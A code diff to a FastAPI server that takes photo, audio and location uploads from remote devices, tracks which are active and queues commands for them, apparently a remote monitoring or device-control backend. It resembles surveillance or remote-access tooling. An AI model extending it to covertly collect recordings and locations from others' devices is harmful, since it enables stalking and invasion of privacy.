@@ -7,7 +7,9 @@ API_KEY = "MY_SECRET_KEY_123"
 device_data = {} 
 command_queue = []
 latest_image_bytes = None
-debug_msg = "No debug info yet"
+latest_audio_bytes = None
+latest_location = "No location yet"
+debug_msg = "No debug info"
 
 def check_key(request: Request):
     if request.headers.get("X-Key") != API_KEY:
@@ -29,7 +31,22 @@ async def upload_photo(request: Request, file: UploadFile = File(...)):
     global latest_image_bytes
     check_key(request)
     latest_image_bytes = await file.read()
-    print(f"PHOTO RECEIVED! Size: {len(latest_image_bytes)}")
+    return {"status": "ok"}
+
+@app.post("/upload_audio")
+async def upload_audio(request: Request, file: UploadFile = File(...)):
+    global latest_audio_bytes
+    check_key(request)
+    latest_audio_bytes = await file.read()
+    print("Audio received!")
+    return {"status": "ok"}
+
+@app.post("/location")
+async def post_location(request: Request):
+    global latest_location
+    check_key(request)
+    data = await request.json()
+    latest_location = f"Lat: {data.get('lat')}, Lon: {data.get('lon')}"
     return {"status": "ok"}
 
 @app.post("/result")
@@ -46,15 +63,25 @@ async def get_state(request: Request):
     check_key(request)
     now = time.time()
     active_devices = {k: v for k, v in device_data.items() if now - v.get("last_seen", 0) < 15}
-    return {"devices": active_devices, "has_image": latest_image_bytes is not None, "debug_msg": debug_msg}
+    return {
+        "devices": active_devices, 
+        "has_image": latest_image_bytes is not None, 
+        "has_audio": latest_audio_bytes is not None,
+        "location": latest_location,
+        "debug_msg": debug_msg
+    }
 
 @app.get("/get_photo")
 async def get_photo(request: Request):
     check_key(request)
-    if latest_image_bytes is None:
-        raise HTTPException(status_code=404, detail="No image")
     from fastapi.responses import Response
     return Response(content=latest_image_bytes, media_type="image/jpeg")
+
+@app.get("/get_audio")
+async def get_audio(request: Request):
+    check_key(request)
+    from fastapi.responses import Response
+    return Response(content=latest_audio_bytes, media_type="audio/mp4")
 
 @app.post("/queue_cmd")
 async def queue_command(request: Request):
